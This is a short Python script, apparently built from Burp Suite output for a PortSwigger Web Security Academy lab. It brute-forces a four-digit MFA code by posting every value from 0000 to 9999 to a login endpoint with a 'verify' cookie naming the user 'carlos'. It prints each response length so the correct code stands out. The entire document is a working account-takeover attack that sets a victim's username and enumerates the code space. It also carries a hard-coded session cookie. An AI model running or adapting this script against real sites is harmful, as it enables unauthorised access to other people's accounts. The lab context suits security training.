import requests

session = requests.session()

for i in range(10000):
	burp0_url = "https://0a21004a039d924fc055448c00d7005b.web-security-academy.net:443/login2"
	burp0_cookies = {"session": "RG0WHDqWlaWXUHee9hIDty3SK5XAHW7E", "verify": "carlos"}
	burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:107.0) Gecko/20100101 Firefox/107.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "https://0a21004a039d924fc055448c00d7005b.web-security-academy.net/login2", "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://0a21004a039d924fc055448c00d7005b.web-security-academy.net", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1", "Te": "trailers", "Connection": "close"}
	burp0_data = {"mfa-code": f"{i:04d}"}
	r = session.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
	print(str(i)+"  "+str(len(r.text)))